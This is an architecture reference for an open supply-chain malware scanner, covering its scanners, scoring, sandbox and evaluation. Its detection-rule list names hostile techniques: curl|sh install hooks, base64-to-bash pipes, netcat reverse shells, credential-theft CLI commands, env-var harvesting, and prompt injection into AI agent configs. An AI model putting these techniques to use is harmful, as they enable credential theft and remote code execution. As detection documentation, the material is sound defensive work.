# ARCHITECTURE.md

Technical architecture reference for MUAD'DIB supply-chain threat detection tool.

For development instructions, constraints, and workflow, see [CLAUDE.md](CLAUDE.md).

## Pipeline Overview

```
bin/muaddib.js (yargs CLI)
  └─► src/index.js — run(targetPath, options)
        ├─► Module Graph pre-analysis (src/scanner/module-graph.js)
        ├─► Deobfuscation pre-processing (src/scanner/deobfuscate.js)
        ├─► 16 parallel scanners (Promise.all)
        │     ├── AST scanner (src/scanner/ast.js)
        │     ├── Dataflow scanner (src/scanner/dataflow.js)
        │     ├── Shell scanner (src/scanner/shell.js)
        │     ├── Package scanner (src/scanner/package.js)
        │     ├── Dependencies scanner (src/scanner/dependencies.js)
        │     ├── Obfuscation scanner (src/scanner/obfuscation.js)
        │     ├── Entropy scanner (src/scanner/entropy.js)
        │     ├── Typosquat scanner (src/scanner/typosquat.js)
        │     ├── Python scanner (src/scanner/python.js)
        │     ├── AI Config scanner (src/scanner/ai-config.js)
        │     ├── GitHub Actions scanner (src/scanner/github-actions.js)
        │     ├── Hash scanner (src/scanner/hash.js)
        │     ├── IOC strings (src/scanner/ioc-strings.js, intel-triage P1.1)
        │     ├── Anti-forensic AST (src/scanner/anti-forensic.js, intel-triage P1.2)
        │     ├── Stub package (src/scanner/stub-package.js, intel-triage P1.3)
        │     └── Intent coherence (src/intent-graph.js)
        ├─► Deduplication
        ├─► FP reductions (src/scoring.js — applyFPReductions)
        ├─► Intent coherence analysis (src/intent-graph.js — buildIntentPairs)
        ├─► Rule enrichment (src/rules/index.js — 211 rules)
        ├─► Scoring (src/scoring.js — per-file max)
        ├─► ML classifier (src/ml/classifier.js — T1 zone filtering)
        └─► Output (CLI / JSON / HTML / SARIF)
```

**Core orchestration:** `src/index.js` — `run(targetPath, options)` runs cross-file module graph analysis first, then launches 16 individual scanners in parallel via `Promise.all` (intel-triage P1 added: `scanIocStrings`, `scanAntiForensic`, `scanStubPackage`), then deduplicates, applies FP reductions, scores using per-file max (v2.2.11: `riskScore = min(100, max(file_scores) + package_level_score)`, severity weights: CRITICAL=25, HIGH=10, MEDIUM=3, LOW=1), applies intent coherence analysis (intra-file source-sink pairing), enriches with rules/playbooks (211 rules), and outputs (CLI/JSON/HTML/SARIF). Result includes `warnings: []` array (v2.6.5) for incomplete scan notifications (module graph timeout/skip, deobfuscation failures). Exports `isPackageLevelThreat` and `computeGroupScore` for testing.

## Scanner Modules

**Scanner pattern:** Each of the 13 individual scanners in `src/scanner/` returns `Array<{type, severity, message, file}>`:
- `file` must use `path.relative(targetPath, absolutePath)` for Windows compatibility
- Sync scanners are wrapped in `Promise.resolve()` in the Promise.all
- Use `findFiles(dir, { extensions, excludedDirs })` from `src/utils.js` for file walking
- Size guard: skip files > 10MB via `fs.statSync`

### PyPI Support

`src/scanner/python.js` detects Python projects by scanning `requirements.txt`, `setup.py`, and `pyproject.toml`. Dependencies are matched against PyPI IOCs (14K+ from OSV dump) and checked for typosquatting via Levenshtein distance with PEP 503 normalization.

### AI Config Scanner (v2.2)

`src/scanner/ai-config.js` scans AI agent configuration files (`.cursorrules`, `.cursorignore`, `.windsurfrules`, `CLAUDE.md`, `AGENT.md`, `.github/copilot-instructions.md`, `copilot-setup-steps.yml`) for prompt injection patterns. Detects shell commands, exfiltration, credential access, and injection instructions. Compound detection (shell + exfil/credentials) escalates to CRITICAL.

### Deobfuscation Pre-processing (v2.2.5)

`src/scanner/deobfuscate.js` applies static AST-based deobfuscation before AST and dataflow scanners. 4 transformations: string concat folding, charcode reconstruction, base64 decode, hex array resolution. Phase 2 const propagation resolves `const x = 'literal'` references. Additive approach: original code scanned first (preserves obfuscation signals), then deobfuscated code adds new findings. Disable with `--no-deobfuscate`.

### Inter-module Dataflow (v2.2.6, bounded path v2.6.1)

`src/scanner/module-graph.js` builds a dependency graph of local modules, annotates tainted exports (fs.readFileSync, process.env, os.homedir, os.hostname, os.userInfo, os.networkInterfaces, child_process, dns), and detects when credentials read in one module reach a network/exec sink in another module. Features: 3-hop re-export chain propagation, class method analysis, named export destructuring, inline require re-export, function-wrapped taint propagation. v2.6.1 additions: bounded path (MAX_GRAPH_NODES=50, MAX_GRAPH_EDGES=200, MAX_FLOWS=20, 5s timeout), imported sink method detection, class `this.X` instance taint, stream pipeline `.pipe()` chain following, EventEmitter cross-module detection, pipe chain cross-file flows. Runs before individual scanners. Disable with `--no-module-graph`.

## Scoring System

### Per-File Max Scoring (v2.2.11)

Replaces global score accumulation with per-file max scoring. Formula: `riskScore = min(100, max(file_scores) + package_level_score)`. Threats are split into package-level (lifecycle scripts, typosquat, IOC matches, sandbox findings — classified by `PACKAGE_LEVEL_TYPES` Set + file heuristics) and file-level (AST, dataflow, obfuscation). File-level threats grouped by `threat.file`, each group scored independently via `computeGroupScore()`. Package-level threats scored separately. Result includes `globalRiskScore` (old sum), `maxFileScore`, `packageScore`, `mostSuspiciousFile`, `fileScores` map.

### FP Reduction Post-processing (v2.2.8–v2.3.1, v2.5.15–v2.5.16, v2.6.2)

`applyFPReductions()` in `src/scoring.js` applies count-based severity downgrades between deduplication and scoring. Thresholds: `dynamic_require` >10 HIGH→LOW, `dangerous_call_function` >5 MEDIUM→LOW, `require_cache_poison` >3 CRITICAL→LOW (single hit CRITICAL→HIGH), `suspicious_dataflow` >5 any→LOW, `obfuscation_detected` >3 any→LOW, `module_compile` >3 HIGH→LOW, `module_compile_dynamic` >3 HIGH→LOW, `zlib_inflate_eval` >2 CRITICAL→LOW, `credential_regex_harvest` >4 HIGH→LOW. Framework prototype hooks (Request/Response/App/Router.prototype) downgraded HIGH→MEDIUM (CRITICAL core prototypes untouched). HTTP client prototype whitelist: packages with >20 prototype_hook hits targeting HTTP methods → MEDIUM. Prototype hook MEDIUM scoring capped at 15 points max. Dist/build/minified file downgrade (one severity notch). Reachability-based downgrade (unreachable files → LOW). Typosquat whitelist expanded with 10 packages (chai, pino, ioredis, bcryptjs, recast, asyncdi, redux, args, oxlint, vasync). Scanner-level: expanded `SAFE_ENV_VARS` (+13 vars) and added `SAFE_ENV_PREFIXES` (npm_config_*, npm_lifecycle_*, npm_package_*, lc_*) in `src/scanner/ast.js`. Obfuscation in dist/build/*.bundle.js and .cjs/.mjs >100KB → LOW. Entropy: encoding table paths → LOW. Dataflow: os.platform/arch categorized as `telemetry_read` (capped at HIGH, not CRITICAL). Package scanner: `DEP_FP_WHITELIST` (es5-ext, bootstrap-sass), npm alias skip (`npm:` prefix).

**FP Reduction P5 (v2.5.15):** 7 heuristic precision fixes improving detection accuracy without reducing coverage.

**FP Reduction P6 (v2.5.16):** Compound detection precision — 6 fixes: (1) `credential_regex_harvest` count-based downgrade (>4 hits HIGH→LOW). (2) Remove `remote_code_load` and `proxy_data_intercept` from DIST_EXEMPT_TYPES. (3) Obfuscation `.js` >100KB → LOW. (4) Remove `discord`/`leveldb` from SENSITIVE_PATH_PATTERNS. (5) `module_compile`/`module_compile_dynamic` baseline CRITICAL→HIGH. (6) `DATAFLOW_SAFE_ENV_VARS` — exclude Node.js runtime config from credential sources. TPR: 91.8% → **93.9%** (46/49). FPR: 13.6% → **12.3%** (65/529).

**FP Reduction P7 (v2.6.2):** 7 heuristic fixes: (1) LOW-severity alert filtering in monitor. (2) Monorepo scope grouping for publish anomaly. (3) `env_access` count threshold (>10 → LOW). (4) `suspicious_dataflow` full bypass (removed 80% ratio guard). (5) `high_entropy_string` count threshold (>5 → LOW). (6) Extended DIST_FILE_RE (`out|output`) + `env_access` added to DIST_BUNDLER_ARTIFACT_TYPES. (7) `credential_regex_harvest` threshold lowered (>2 → LOW). FPR: 12.3% → **12.1%** (64/529).

## Intent Graph

**Intent Graph Analysis (v2.6.0):** `src/intent-graph.js` performs intra-file source-sink coherence analysis. When a single file contains both a high-confidence credential source (sensitive_string, env_harvesting_dynamic, credential_regex_harvest) AND a dangerous sink (eval, exec, network), the intent graph boosts the score via a coherence matrix. Design principles: (1) INTRA-FILE pairing only — cross-file co-occurrence without proven data flow causes FP explosion on SDKs. (2) Cross-file detection delegated to module-graph.js (proven taint paths). (3) LOW severity threats excluded from pairing (respects FP reductions). (4) env_access and suspicious_dataflow excluded (standard config / double-counting). Intent bonus capped at 30 in scoring.js. Pipeline: deduplication → applyFPReductions → buildIntentPairs → enrichWithRules → calculateRiskScore.

**Destination-aware Intent (v2.7.7):** `isSDKPattern()` with 22 curated SDK env-domain mappings (AWS, Azure, Google, Firebase, Stripe, Twilio, SendGrid, Datadog, Sentry, Slack, GitHub, GitLab, Cloudflare, OpenAI, Anthropic, MongoDB, Auth0, HubSpot, Contentful, Salesforce, Supabase, Mailgun). Heuristic brand-matching fallback for unknown SDKs. `SUSPICIOUS_DOMAIN_PATTERNS` blocks tunneling services (ngrok, serveo, localtunnel) and raw IP addresses from SDK exemption. `buildIntentPairs()` accepts `targetPath` parameter for file reading (SDK pattern detection). Helpers: `extractEnvVarFromMessage()`, `extractBrandFromEnvVar()`, `domainMatchesSuffix()`.

## Sandbox

### Docker Sandbox (v2.1.2)

`src/sandbox/index.js` — Docker-based dynamic analysis: installs a package in an isolated container, captures filesystem changes, network traffic (tcpdump), and process spawns (strace). Injects canary tokens by default. Multi-run mode (v2.4.9) with monkey-patching preload for time-bomb detection.

**Sandbox Enhancements (v2.1.2):**
- CI-aware environment: `sandbox-runner.sh` sets CI=true, GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL to trigger CI-aware malware
- Enriched canary tokens: 6 static honeypots (GITHUB_TOKEN, NPM_TOKEN, AWS keys, SLACK/DISCORD webhooks) as fallback to dynamic tokens
- `detectStaticCanaryExfiltration()` in `src/sandbox/index.js` searches all report fields for static canary values
- Strict webhook filtering: monitor alerts only for IOC match, sandbox confirm, or canary exfiltration

### Monkey-Patching Preload (v2.4.9)

`docker/preload.js` is a runtime monkey-patching script injected via `NODE_OPTIONS=--require /opt/preload.js` in the Docker sandbox. Detects time-bomb malware (MITRE T1497.003) that delays exfiltration past sandbox timeout.

- **Architecture**: `src/sandbox/index.js` (migrated from `src/sandbox.js`) orchestrates 3 sequential Docker runs at time offsets [0ms, 72h, 7d]. `runSandbox()` calls `runSingleSandbox()` with `MUADDIB_TIME_OFFSET_MS` env var. Early exit on score >= 80.
- **Preload patches** (IIFE, closure-scoped originals): Time APIs (Date.now, constructor, performance.now, process.hrtime/bigint, process.uptime), timers (setTimeout→0, setInterval→immediate first exec), network (http/https.request, fetch, dns, net.connect), filesystem (sensitive path detection via regex), process (child_process.* with dangerous command detection), environment (Proxy on process.env for sensitive key access).
- **Analyzer**: `src/sandbox/analyzer.js` parses `[PRELOAD]` log lines with 6 scoring rules: timer delay suspicious (>1h, MEDIUM +15), timer delay critical (>24h, CRITICAL +30, supersedes suspicious), sensitive file read (HIGH +20), network after sensitive read (CRITICAL +40, compound), exec suspicious (HIGH +25), env token access (MEDIUM +10).
- **Docker changes**: `docker/Dockerfile` copies `preload.js` to `/opt/preload.js`. `docker/sandbox-runner.sh` sets `NODE_OPTIONS`, captures `/tmp/preload.log`, includes `preload_log` in JSON report.

### Intel Triage (mai 2026) — static-first detection alignee sur 2026

Trois nouveaux scanners statiques + l'extension du scraper IOC. Aligne le
projet sur la realite du marche : Zenbox (sandbox commercial) a classe
Axios npm CLEAN avec 99% de confiance ; les malwares 2026 defeat les
sandbox runtime by design (hardware fingerprinting, C2-side detection,
keys in response headers, 48h rate limit). Les outils SOTA (Socket.dev,
GuardDog, Semgrep, Phylum) sont tous static. Cf. `feedback_static_over_dynamic`
memoire.

**Scanner P1.1 `src/scanner/ioc-strings.js`** (rule `MUADDIB-IOC-001`,
threat `ioc_string_match` CRITICAL): YARA-style substring match contre
`iocs/string-iocs.yaml`. Bootstrap avec 15 strings (9 Axios par
N3mes1s gist + 3 TeamPCP + 1 GlassWorm + 2 CanisterSprawl + extensions).
Loader `loadStringIocsYAML` ajoute dans `src/ioc/yaml-loader.js` ;
expose `iocs.stringIocs` + `iocs.stringIocsMap` via `loadCachedIOCs`.
Match en source = signal CRITICAL transverse a tous les variants qui
reuse un meme stager / XOR key / RAT command name.

**Scanner P1.2 `src/scanner/anti-forensic.js`** (rules `MUADDIB-AF-001/002`):
detection AST compound de la classe Axios/csec autodelete. Trois patterns :
(1) XOR loop avec literal-derived operand (charCodeAt sur literal, ou XOR
avec literal number), (2) self-delete (fs.unlink/rename de __filename ou
path matchant `node_modules/<pkg>/<file>.(c|m)?js`), (3) decoy write
(fs.writeFile vers `.md|.bak|.tmp|.txt|.log`). 3 of 3 = CRITICAL ; 2 of 3
= HIGH partial. Pre-filtre regex pour skipper les bundles benign sans
operateur `^`.

**Scanner P1.3 `src/scanner/stub-package.js`** (rules `MUADDIB-STUB-001/002`):
ferme le gap ltidi chain attack documente en memoire. Conditions :
(1) package.json declare au moins une dep avec URL externe (https/git/github),
(2) main file < 500 octets meaningful (comments stripped), (3) lifecycle hook
present. Triggers `stub_package_external_payload` CRITICAL. Sans lifecycle
= `stub_package_external_dep` HIGH. Walks node_modules sub-deps avec scoped
package handling.

**Aikido feed `src/ioc/scraper.js:scrapeAikidoMalwareFeed`** : pull
`malware-list.aikido.dev/malware_predictions.json` + `_pypi.json`. Smoke
live mai 2026 : 121 521 npm + 3 064 PyPI MALWARE entries source-tagged
`aikido`. Plug into runScraper Phase 2 + dedup avec source accumulation.

**Source-aware confidence `getSourceConfidence(pkg)`** : la dedup au scraper
maintient un array `sources: [{name, added_at}]` par entree (name@version).
Helper retourne `{tier: 'high'|'medium'|'low', count, sources}` ou tier
`high` = 3+ feeds distincts. Permet aux consumers (webhook, /diff) de
prioriser les alertes cross-confirmees.

**Compounds intel-triage** : `axios_family` (ioc_string_match + lifecycle_script
+ anti_forensic_partial) et `stub_with_string_ioc` (stub_package_external_dep
+ ioc_string_match). Rules `MUADDIB-COMPOUND-AXIOS` et `MUADDIB-COMPOUND-STUB-IOC`.

**CLI tool `scripts/git-vs-npm-diff.js`** : telecharge tarball npm + archive
GitHub correspondant au tag, hash chaque fichier .js/.cjs/.mjs/.ts/.tsx/.json,
signale les `npm-only` (publish-time injection) ou `hash-differs`. Catch les
compromissions par token vole (Axios mode). Usage manuel par l'operateur
quand un package suspect est surface.

## IOC System (3-tier)

1. `src/ioc/data/iocs-compact.json` (~5MB, ships with npm) — wildcards[] + versioned{} Maps for O(1) lookup
2. YAML files in `iocs/` — builtin rules
3. External sources (downloaded by `muaddib update`) — Shai-Hulud, DataDog, OSV dump

`loadCachedIOCs()` from `src/ioc/updater.js` merges all tiers and returns optimized Maps/Sets.

## Evaluation Framework

**Evaluation Framework (v2.2, corrected v2.2.7, updated through v2.10.95):** `src/commands/evaluate.js` measures TPR (Ground Truth, 65 active real attacks from 67 samples; 2 out-of-scope GT-005/GT-009 protestware with min_threats=0), FPR (Benign, 548 npm curated packages — real source code via `npm pack` + native tar extraction), and ADR (Adversarial + Holdout, 107 evasive samples — 67 adversarial + 40 holdout). Benign tarballs cached in `.muaddib-cache/benign-tarballs/`. Flags: `--benign-limit N`, `--refresh-benign`. Results saved to `metrics/v{version}.json`.

**FPR progression:** 0% (invalid, v2.2.0–v2.2.6) → 38% (v2.2.7) → 19.4% (v2.2.8) → 17.5% (v2.2.9) → ~13% (69/527, v2.2.11) → 8.9% (47/527, v2.3.0) → 7.4% (39/525, v2.3.1) → 6.0% (32/529, v2.5.8, included BENIGN_PACKAGE_WHITELIST bias) → ~13.6% (72/529, v2.5.14, audit hardening + whitelist removed in v2.5.10) → 12.3% (65/529, v2.5.16, P5+P6) → 12.1% (64/529, v2.6.2, P7) → 12.9% (68/529, v2.9.4, compound scoring + new rules) → **10.8%** (57/529, v2.10.1, audit v3 FP reduction) → **14.0%** (74/532, v2.10.57, curated benign corpus rebuild) → **estimated 6-9%** (v2.10.74, P1-P4 FP cluster fixes — projected gain) → **15.6% measured** (85/545 scanned of 548, v2.10.95 metrics file — the v2.10.74 projected reduction did NOT materialize on the rebuilt corpus) → **post-filtre F1-F7 contextual FP caps** (v2.10.97, validated on a separate 302-package human-only corpus: 67/198 FP capped = 33.8 % reduction on that subset, 0/104 malware impacted; full re-measurement on 548 corpus pending).

**Datasets:**
- Adversarial samples in `datasets/adversarial/` (67 samples)
- Holdout samples in `datasets/holdout-v2/` through `datasets/holdout-v5/` (40 samples)
- Benign package lists in `datasets/benign/packages-npm.txt` (532 packages) and `datasets/benign/packages-pypi.txt` (132 packages)
- Ground truth attacks in `tests/ground-truth/attacks.json` (51 entries)
- Ground truth malware database in `datasets/ground-truth/known-malware.json` (65 entries)

### Ground Truth Expansion (v2.2.12)

67 real-world attack samples in `tests/ground-truth/` (65 active, 2 with min_threats=0: GT-005 colors and GT-009 faker, both protestware). TPR@3: **93.85% (61/65)** as of v2.10.95 (canonical metrics file). TPR@20: **86.2% (56/65)**. 4 active misses include the 3 browser-only attacks (lottie-player, polyfill-io, trojanized-jquery) plus 1 other. ADR: 107 samples (67 adversarial + 40 holdout). ADR: **96.3% (103/107 available)** as of v2.10.95.

## Monitor

**Monitor (internal, not user-facing):** `src/monitor.js` — `muaddib monitor` runs on VPS via systemd, polls npm/PyPI every 60s. Exports `loadDetections`, `getDetectionStats`, `loadScanStats`.

### Webhook Noise Reduction (v2.7.5)

4 chantiers: (1) Self-exclude: `SELF_PACKAGE_NAME` constant skips `muaddib-scanner` in pollNpm(). (2) WASM standalone: new rule `wasm_standalone` (AST-046, MEDIUM) for WebAssembly without network sinks, mutually exclusive with `wasm_host_sink` (CRITICAL). (3) Reputation scoring: `computeReputationFactor()` adjusts webhook score based on age/versions/downloads (floor 0.3, ceiling 1.5), IOC matches bypass. (4) Scope dedup: `bufferScopedWebhook()` groups scoped npm packages within 5min window into single grouped Discord webhook.

### High-Confidence Malice Bypass (v2.7.6)

`HIGH_CONFIDENCE_MALICE_TYPES` (19 types): `lifecycle_shell_pipe`, `fetch_decrypt_exec`, `download_exec_binary`, `reverse_shell`, `crypto_staged_payload`, `intent_credential_exfil`, `intent_command_exfil`, `cross_file_dataflow`, `canary_exfiltration`, `sandbox_network_after_sensitive_read`, `sandbox_known_exfil_domain`, `detached_credential_exfil`, `node_modules_write`, `npm_publish_worm`, `systemd_persistence`, `npm_token_steal`, `root_filesystem_wipe`, `proc_mem_scan`, `trusted_new_unknown_dependency`. These bypass reputation attenuation — supply-chain compromise of established packages cannot be suppressed.

**Aggressive reputation tiers:** `computeReputationFactor()` floor lowered from 0.30 to 0.10. New tiers: 5+ years age (-0.5), 200+ versions (-0.3), 1M+ weekly downloads (-0.4).

**Graduated webhook threshold:** `getWebhookThreshold()` returns 35 (very established, factor ≤0.5), 25 (established, factor ≤0.8), 20 (new/unknown) — established packages require higher static score to trigger webhook.

### Destination-Aware Intent (v2.7.7)

See [Intent Graph](#intent-graph) section for `isSDKPattern()` details and 22 SDK env-domain mappings.

**HC bypass severity check:** Monitor validates severity !== LOW before counting HC types.

### Size Cap and Scan Memory (v2.7.8)

**Size cap 20MB** (monitor-only): `LARGE_PACKAGE_SIZE = 20MB` — skip full scan for packages >20MB unpacked. Malware payloads are tiny (<1MB); 20MB provides 20x safety margin. Exceptions: IOC match (always scan), suspicious lifecycle scripts (always scan).

**MCP server awareness:** `mcp_config_injection` downgraded CRITICAL→MEDIUM when `@modelcontextprotocol/sdk` is in package dependencies — legitimate MCP servers write config files.

**Scan history memory** (monitor-only): Cross-session webhook dedup via `scan-memory.json`. `shouldSuppressByMemory()` suppresses duplicate webhooks when score within ±15% and no new threat types. 30-day expiry, 50K max entries. IOC match and HC types bypass memory suppression.

## Behavioral Anomaly Detection

**Supply Chain Anomaly Detection (v2.0):** 5 behavioral detection features that detect attacks before IOCs exist:
- `src/temporal-analysis.js` — Sudden lifecycle script detection (`--temporal`): detects `preinstall`/`install`/`postinstall` added in latest version
- `src/temporal-ast-diff.js` — Temporal AST diff (`--temporal-ast`): compares ASTs between versions to detect newly added dangerous APIs
- `src/publish-anomaly.js` — Publish frequency anomaly (`--temporal-publish`): detects publish bursts, dormant spikes, rapid succession
- `src/maintainer-change.js` — Maintainer change detection (`--temporal-maintainer`): detects new/suspicious maintainers, sole maintainer change
- `src/canary-tokens.js` — Canary tokens (sandbox): injects fake credentials and detects exfiltration attempts
- `--temporal-full` enables all 4 temporal features at once

## Security Hardening

**Security Hardening (v2.1.2):**
- `src/shared/download.js` — SSRF-safe downloadToFile (domain allowlist + private IP blocking), injection-safe extractTarGz (execFileSync), sanitizePackageName (path traversal prevention)
- `src/shared/constants.js` — Centralized NPM_PACKAGE_REGEX, MAX_TARBALL_SIZE, DOWNLOAD_TIMEOUT

**Validation & Observability (v2.1):** Features for measuring and validating scanner effectiveness:
- `src/ground-truth.js` — Ground truth dataset: 67 real-world attacks (65 active, 2 protestware with min_threats=0) replayed against scanner. 93.85% TPR@3 (61/65) as of v2.10.95.
- `--breakdown` flag — Explainable score decomposition showing per-finding contribution

## Detection Rules

**Rules & playbooks:** Threat types map to rules in `src/rules/index.js` (209 rules: 204 RULES + 5 PARANOID, MITRE ATT&CK mapped) and remediation text in `src/response/playbooks.js`. Both keyed by threat `type` string.

### AST Detection Rules (v2.2+)

- MUADDIB-AST-008 to AST-012: Dynamic require with decode patterns, sandbox evasion, detached process, binary dropper patterns
- MUADDIB-AST-013: AI agent abuse (s1ngularity/Nx pattern — `--dangerously-skip-permissions`, `--yolo` flags)
- MUADDIB-AST-014: Credential CLI theft (`gh auth token`, `gcloud auth print-access-token`, `aws sts get-session-token`)
- MUADDIB-AST-015: Workflow write (fs.writeFileSync to `.github/workflows`, with variable propagation + regex fallback)
- MUADDIB-AST-016: Binary dropper (fs.chmodSync 0o755 + exec of temp file)
- MUADDIB-AST-017: Prototype hooking (globalThis.fetch, XMLHttpRequest.prototype, Node.js core module prototypes)
- MUADDIB-AST-018: Env charcode reconstruction (String.fromCharCode to build env var names)
- MUADDIB-AICONF-001: AI config prompt injection (HIGH)
- MUADDIB-AICONF-002: AI config compound injection — shell + exfil/credentials (CRITICAL)
- MUADDIB-PKG-010: Lifecycle shell pipe (curl|sh or wget|sh in preinstall/install/postinstall)
- MUADDIB-FLOW-003: Credential tampering / cache poisoning (sensitive read + write to cache paths)
- MUADDIB-AST-019: Require cache poisoning (require.cache access to hijack loaded modules)
- MUADDIB-AST-020: Staged binary payload (binary file .png/.jpg/.wasm + eval in same file — steganographic execution)
- MUADDIB-AST-021: Staged eval decode (eval/Function with atob or Buffer.from base64 argument — CRITICAL)
- MUADDIB-FLOW-004: Cross-file dataflow (credential read in one module, network exfil in another — CRITICAL)
- MUADDIB-AST-022: Encrypted payload decryption (crypto.createDecipher/createDecipheriv — flatmap-stream pattern, HIGH, T1140)
- MUADDIB-AST-023: Module compile execution (module._compile() — in-memory code execution, HIGH, T1059)
- MUADDIB-AST-024: Obfuscated payload via zlib inflate (zlib.inflateSync + eval — CRITICAL, T1140)
- MUADDIB-AST-025: Dynamic module compile execution (new Module() + _compile — HIGH, T1059)
- MUADDIB-AST-026: Anti-forensics write-execute-delete (write + exec + unlink — HIGH, T1070)
- MUADDIB-AST-027: MCP config injection (MCP server config manipulation — CRITICAL, T1059)
- MUADDIB-AST-028: Git hooks injection (write to .git/hooks — HIGH, T1195.002)
- MUADDIB-AST-029: Dynamic env var harvesting (Object.keys(process.env) — HIGH, T1552)
- MUADDIB-AST-030: DNS chunk exfiltration (dns.resolve with data in subdomain — HIGH, T1048)
- MUADDIB-AST-031: LLM API key harvesting (OPENAI_API_KEY, ANTHROPIC_API_KEY — MEDIUM, T1552)
- MUADDIB-AST-033: Steganographic payload chain (fetch + crypto decrypt + eval/Function — CRITICAL, T1027.003)
- MUADDIB-AST-034: Download-execute binary (download + chmod + execSync — CRITICAL, T1105)
- MUADDIB-AST-035: IDE task persistence (tasks.json + runOn:folderOpen + writeFileSync — HIGH, T1546)
- MUADDIB-SANDBOX-009: Suspicious timer delay (setTimeout/setInterval > 1h — MEDIUM, T1497.003)
- MUADDIB-SANDBOX-010: Critical timer delay / time-bomb (setTimeout/setInterval > 24h — CRITICAL, T1497.003)
- MUADDIB-SANDBOX-011: Preload sensitive file read (.npmrc/.ssh/.aws/.env via runtime monkey-patching — HIGH, T1552.001)
- MUADDIB-SANDBOX-012: Network after sensitive read (compound: file read + network — CRITICAL, T1041)
- MUADDIB-SANDBOX-013: Suspicious command execution (curl/wget/bash/sh/powershell via runtime monkey-patching — HIGH, T1059)
- MUADDIB-SANDBOX-014: Sensitive env var access (TOKEN/SECRET/KEY/PASSWORD via runtime monkey-patching — MEDIUM, T1552.001)
- MUADDIB-SHELL-013: FIFO + netcat reverse shell (mkfifo + nc sans /dev/tcp — CRITICAL, T1059.004)
- MUADDIB-SHELL-014: Base64 decode pipe to shell (base64 -d | bash — CRITICAL, T1140)
- MUADDIB-SHELL-015: Wget + base64 decode two-stage (wget + base64 -d — HIGH, T1105)
- MUADDIB-ENTROPY-004: Fragmented high entropy cluster (many short high-entropy strings — MEDIUM, T1027)
- MUADDIB-INTENT-001: Intent credential exfiltration (intra-file credential_read + exec/network sink — CRITICAL, T1041)
- MUADDIB-INTENT-002: Intent command output exfiltration (intra-file command_output + network sink — HIGH, T1041)
- MUADDIB-AST-046: WASM standalone module load (WebAssembly without network sinks — MEDIUM, T1027)

### Red Team DPRK (v2.6.0)

10 new adversarial samples in `datasets/adversarial/`. Group A (5 pure-API, multi-file): locale-config-sync, metrics-aggregator-lite, env-config-validator, stream-transform-kit, cache-warmup-utils. Group B (5 eval evasion): fn-return-eval, call-chain-eval, regex-source-require, charcode-arithmetic, object-method-alias. Scanner fixes: eval factory detection (`() => eval`), `.call.call(eval)` deep MemberExpression, `require(/regex/.source)` resolution, charcode arithmetic evaluation, object-method-alias taint tracking.

## Other Key Features

- `src/diff.js` — Compares scan results between two git refs to surface only new threats (useful in CI). Exports `getThreatId`, `compareThreats`, `resolveRef` for testing.

### Internal Commands (not user-facing)

The following commands are internal infrastructure/dev tools. They work when called directly but are intentionally hidden from `--help` and the interactive menu. Do not expose them in user-facing documentation or CLI help.
- `src/monitor.js` — `muaddib monitor` runs on VPS via systemd, polls npm/PyPI every 60s. Exports `loadDetections`, `getDetectionStats`, `loadScanStats`.
- `src/threat-feed.js` — `muaddib feed` (JSON stdout) and `muaddib serve` (HTTP server with `/feed` and `/health`). SIEM integration for VPS infrastructure.
- `muaddib detections` — Detection history with lead time metrics. Uses monitor exports.
- `muaddib stats` — Daily scan statistics and FP rate. Uses monitor exports.
- `src/commands/evaluate.js` — `muaddib evaluate` measures TPR/FPR/ADR. Dev-only evaluation command.

## Compound Scoring Rules (v2.9.2)

`applyCompoundBoosts()` in `src/scoring.js` injects synthetic CRITICAL threats when co-occurring threat types are detected — combinations that never appear in benign packages. Called after `applyFPReductions`. 4 compound rules:

| Rule ID | Name | Required Types | Severity |
|---------|------|---------------|----------|
| MUADDIB-COMPOUND-001 | Crypto Staged Payload | staged_binary_payload + crypto_decipher | CRITICAL |
| MUADDIB-COMPOUND-002 | Lifecycle Typosquat | lifecycle_script + typosquat_detected | CRITICAL |
| MUADDIB-COMPOUND-004 | Lifecycle Inline Exec | lifecycle_script + node_inline_exec | CRITICAL |
| MUADDIB-COMPOUND-005 | Lifecycle Remote Require | lifecycle_script + network_require | CRITICAL |

3 package-level compounds (COMPOUND-002, 004, 005) are in `PACKAGE_LEVEL_TYPES`. `dangerous_exec` added to `DIST_EXEMPT_TYPES` (curl|bash in dist/ is always malicious).

## GlassWorm Detection (v2.9.1)

GlassWorm campaign (March 2026, 433+ packages): Unicode invisible characters + Blockchain C2.

- **Unicode invisible detection**: `countInvisibleUnicode()` in `obfuscation.js`, threshold >=3 chars. Detects zero-width (U+200B/C/D), BOM (U+FEFF pos>0), word joiner (U+2060), Mongolian vowel separator (U+180E), variation selectors (U+FE00-FE0F, U+E0100-E01EF), tag characters (U+E0001-E007F).
- **OBF-003**: `unicode_invisible_injection` rule
- **AST-053**: `unicode_variation_decoder` — .codePointAt + 0xFE00/0xE0100 compound
- **AST-054**: `blockchain_c2_resolution` — Solana import + C2 methods (getSignaturesForAddress etc.). CRITICAL with eval/exec, HIGH otherwise
- **AST-055**: `blockchain_rpc_endpoint` — hardcoded Solana/Infura/Ankr endpoints (MEDIUM)
- 6 GlassWorm C2 IPs added to SUSPICIOUS_DOMAINS_HIGH
- IOC: 4 markers, 2 files, 1 hash, 8 compromised packages (builtin.yaml)

### Security Audit v2 Remediation (v2.9.9)

5 bypass remediations from security audit v2 (score 71.9/100):

- **Config security** (CRITIQUE): `.muaddibrc.json` in scanned package is IGNORED. Config auto-detection now only from `~/.muaddibrc.json` or CWD (if CWD ≠ targetPath). Emits `[SECURITY]` warning if config found inside scanned package.
- **BinaryExpression computed property**: `resolveStringConcatWithVars()` resolves double-indirection patterns like `var a='ev',b='al'; globalThis[a+b]()` → CRITICAL.
- **process.mainModule.require**: Detection of `process.mainModule.require('child_process')` as CRITICAL `dynamic_require`.
- **Module._load**: Detection of `Module._load()` / `require('module')._load()` as CRITICAL `module_load_bypass`.
- **AST-056**: `module_load_bypass` — Module._load() internal loader bypass (CRITICAL, T1059.007)

## Version History

### v2.10.97 — Contextual FP post-filter (F1-F7) in scoring.js

- New `applyContextualFPCaps()` in `src/scoring.js` (lines 1036-1119), called after `calculateRiskScore()` so compound boosts and lifecycle floors keep the last word.
- 7 deterministic caps wired on the 7 active features from `feature-extractor.js` (F8 still disabled, see v2.10.96):
  - F1 `bundle_without_install_scripts` → cap 30
  - F2 `install_url_github_releases` → cap 35
  - F3 `network_destination_first_party` → cap 30
  - F4 `git_hook_source_local` → cap 35
  - F5 `typosquat_scoped_package` → subtract typosquat points (no cap)
  - F6 `obfuscation_without_vector` → cap 35
